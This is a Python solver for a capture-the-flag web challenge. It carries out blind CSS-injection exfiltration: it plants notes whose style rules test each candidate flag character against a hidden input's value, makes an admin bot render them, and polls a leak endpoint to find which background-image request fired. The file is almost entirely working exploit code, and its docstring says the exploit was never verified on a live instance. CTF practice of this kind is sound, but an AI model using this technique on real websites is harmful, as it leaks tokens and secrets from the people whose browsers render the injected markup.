#!/usr/bin/env python3
"""
Approve Please, Genie! — blind CSS exfiltration solver.

Intended path:
  1. Create a note whose <style> tests one candidate next char of the flag against
     the hidden input #flag-holder value using an attribute selector.
  2. POST /report so the admin bot renders the note (real flag).
  3. Poll /leaks/<token>; if the /collect query appears, the candidate was correct.

Usage:
  python solve.py HOST:PORT
  e.g. python solve.py 144.79.188.39:35757

Notes
  - Flag format observed across PTIT challenges: PTITCTF{...}
  - Character set is expanded from printable ASCII.
  - The report endpoint rate-limits ("slow down"); the driver sleeps between reports.
  - On the test instance the admin bot returned 'admin bot failed to load the note'
    for every note and the instance then expired — the exploit is unverified.
"""
import requests, string, sys, time, json

BASE = sys.argv[1] if len(sys.argv) > 1 else "144.79.188.39:35757"
PROTO = "http"
if BASE.startswith("http"):
    PROTO, _, BASE = BASE.partition("://")
ROOT = f"{PROTO}://{BASE}"

# printable ASCII minus a few chars that complicate URL/CSS handling
CHARSET = string.ascii_lowercase + string.ascii_uppercase + string.digits + \
          "{}_-:.!@#$%^&*()+=[];',/?"

def make_note(content: str):
    r = requests.post(f"{ROOT}/note", data={"content": content}, timeout=30)
    r.raise_for_status()
    return r.json()

def report(note_id: str):
    r = requests.post(f"{ROOT}/report", data={"id": note_id}, timeout=300)
    return r.json()

def leaks(token: str):
    r = requests.get(f"{ROOT}/leaks/{token}", timeout=30)
    return r.json()

def css_payload(token: str, known: str, cand: str):
    # Attribute selector on the hidden input; exfil on the visible sibling div.
    return (f'<style>'
            f'#flag-holder[value^="{known}{cand}"]~#note-content{{'
            f'display:block;width:300px;height:300px;'
            f'background:url(/collect?t={token}&q={cand})'
            f'}}</style>')

def guess_next(token: str, known: str, sleep: float = 12.0):
    for c in CHARSET:
        content = css_payload(token, known, c)
        note = make_note(content)
        try:
            report(note["id"])
        except Exception as e:
            print(f"  report err: {e}")
        # poll leaks for a bit
        for _ in range(6):
            time.sleep(2)
            try:
                hits = leaks(token)
            except Exception:
                hits = []
            if any(str(h.get("query", {}).get("q")) == c for h in hits):
                return c
        time.sleep(sleep)
    return None

def main():
    # seed a note to obtain a leak token
    seed = make_note("<div>solver</div>")
    token = seed["leakToken"]
    print(f"[*] leakToken={token}")

    known = "PTITCTF{"
    print(f"[*] starting from known prefix: {known}")
    for pos in range(len(known), 60):
        c = guess_next(token, known)
        if c is None:
            print("[!] no candidate matched — stopping")
            break
        known += c
        print(f"[+] pos {pos}: {known!r}")
        if c == "}":
            print("[+] flag candidate:", known)
            break

if __name__ == "__main__":
    main()
